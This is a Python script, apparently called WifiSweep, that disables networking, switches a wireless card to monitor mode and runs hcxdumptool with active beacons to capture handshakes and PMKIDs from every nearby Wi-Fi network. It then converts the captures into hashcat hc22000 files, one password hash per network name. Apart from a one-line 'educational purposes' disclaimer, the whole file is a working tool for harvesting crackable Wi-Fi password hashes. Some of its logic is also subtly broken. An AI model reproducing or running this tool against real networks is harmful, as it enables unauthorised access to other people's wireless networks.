import os
import csv
import subprocess
import time
import numpy as np


'''
FOR EDUCATIONAL PURPOSES ONLY. 
DO NOT USE ON PEOPLE YOU DON'T HAVE PERMISSION FOR.
'''


def logo():
    print()
    print()
    print()
    print(' __      __.__  _____.__  _________                             ')
    print('/  \    /  \__|/ ____\__|/   _____/_  _  __ ____   ____ ______  ')
    print('\   \/\/   /  \   __\|  |\_____  \\\\ \/ \/ // __ \_/ __ \\\____ \ ')
    print(' \        /|  ||  |  |  |/        \\\\     /\  ___/\  ___/|  |_> >')
    print('  \__/\  / |__||__|  |__/_______  / \/\_/  \___  >\___  >   __/ ')
    print('       \/                       \/             \/     \/|__|    ')
    print()
    print()
    print()

def sudo_check():
        if not 'SUDO_UID' in os.environ.keys():
            print('Make sure to run in sudo.')
            exit()

# Creates directory to store files. 
def new_session():
    global session
    global sesh
    storage = os.path.join(os.getcwd(), 'wifi-sweep')
    session = 'session-' + str((int(time.time()) % 1000000000))
    sesh = os.path.join(storage, session)

    # If path hasn't been created (first use) create base folder.
    if not os.path.exists(storage):
        os.mkdir('wifi-sweep')
        os.mkdir(sesh)
    
    # If used before create folder for new session.
    else:
       os.mkdir(sesh)

# find Network Interface Cards
def find_nic():
    # capture output and decode to readable format
    ps = subprocess.Popen(('iw', 'dev'), stdout=subprocess.PIPE)
    nics = subprocess.check_output(('awk', '$1=="Interface"{print $2}'), stdin=ps.stdout).decode("utf-8").strip()\
        .split("\n")
    return nics


# monitor mode
def monitor_On():
    subprocess.run(['ifconfig', NIC, 'down'])
    subprocess.run(['iwconfig', NIC, 'mode', 'monitor'])
    subprocess.run(['ifconfig', NIC, 'up'])

def monitor_Off():
    subprocess.run(['ifconfig', NIC, 'down'])
    subprocess.run(['iwconfig', NIC, 'mode', 'managed'])
    subprocess.run(['ifconfig', NIC, 'up'])


#Network Processes
def networking_On():
    subprocess.run(['systemctl', 'start', 'NetworkManager.service'])
    subprocess.run(['systemctl', 'start', 'wpa_supplicant.service'])

def networking_Off():
    subprocess.run(['systemctl', 'stop', 'NetworkManager.service'])
    subprocess.run(['systemctl', 'stop', 'wpa_supplicant.service'])

# User input for network card
def myNIC():
    global NIC
    network_controllers = find_nic()
    if len(network_controllers) == 0:
        # If no networks interface controllers connected to your computer the program will exit.
        print('Please connect a network interface controller and try again!')
        networking_On()
        exit()

    while True:
        for index, controller in enumerate(network_controllers):
            print(f'{index} - {controller}')
        
        controller_choice = input('Please select the controller you want to put into monitor mode: ')

        try:
            if network_controllers[int(controller_choice)]:
                break
        except:
            print('Please make a valid selection!')

    # Assign the network interface controller name to a variable for easy use.
    NIC = network_controllers[int(controller_choice)]

def captureData():
    filename = 'dumpfile.pcapng'
    outfile = os.path.join(os.getcwd(), 'wifi-sweep', session, filename)
    try:
        subprocess.run(['hcxdumptool', '-i', NIC, '-o', outfile, '--active_beacon', '--enable_status=15'])
    except:
        convert(outfile)


def convert(file):

    print('Networking re-enabled successfully.')
    print('Converting data to hashes')
    hashOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'hash.hc22000')
    macOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'MACS.txt')
    f = open(macOut, 'w')

    #Creates Hash file
    subprocess.run(['hcxpcapngtool', '-o', hashOut, file])

    # Gets SSID (Wifi Names) & BSSIDS (MAC addresses).
    p1 = subprocess.Popen(['tshark', '-r', file, '-e', 'wlan.ssid', '-e', 'wlan.bssid', '-Tfields'], stdout=subprocess.PIPE)

    # Uses Grep to avoid excessive MACs from showing.
    p2 = subprocess.Popen(['grep', '^[A-Za-z0-9`~!@#$%^&*-_+=.,/\|;:]'], stdin=p1.stdout, stdout=subprocess.PIPE)

    # Uses sed to remove colon from MAC (formats like hashchat). 
    p3 = subprocess.call(['sed', 's/://g'], stdin=p2.stdout, stdout=f)

# Matches hashes to MAC adresses.
def matchUP():
    macOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'MACS.txt')
    hashOut = os.path.join(os.getcwd(), 'wifi-sweep', session, 'hash.hc22000')

    # If hashfile exists (PMKID captured) run command, otherwise don't bother.
    if os.path.exists(hashOut):

        # Add MAC info to list.
        macs = []
        with open(macOut, 'r') as mf:
            reader = csv.reader(mf)
            for row in reader:
                macs += reader
        macs = np.char.split(macs)

        # create filtered list just for MAC Addresses.
        x = 0
        merged_macs = [None] * len(macs)
        for m in macs:
            merged_macs[x] = macs[x][0][-1]
            x += 1

        # Add Hashes to list.
        hashes = []
        with open(hashOut, 'r') as hf:
            reader = csv.reader(hf)
            for row in reader:
                hashes += reader

        # Convert hash lists to single list.
        merged_hashes = []
        for h in hashes:
            merged_hashes += h

        # Search for matches between MAC addresses and hash file.
        x= 0
        for item in merged_macs:
            y = 0
            for hashes in merged_hashes:

                # For every match found create a file with the wifi name, that contains the password hash.
                if merged_macs[x] in merged_hashes[y]:
                    matchOut = os.path.join(os.getcwd(), 'wifi-sweep', session, macs[x][0][0])
                    with open(matchOut + '.hc22000', 'w') as wowoweewah:
                        wowoweewah.write(merged_hashes[y])
                    
                y += 1

            x += 1 
    else:
        print('No password hashes captured, exiting.')

def quit():

    monitor_Off()
    networking_On()

    # Because we are running with sudo, we must change file permissions so we can use later without sudo. 




if __name__ == '__main__':
    sudo_check()
    new_session()
    networking_Off()
    logo()
    myNIC()
    monitor_On()
    captureData()
    matchUP()
    quit()


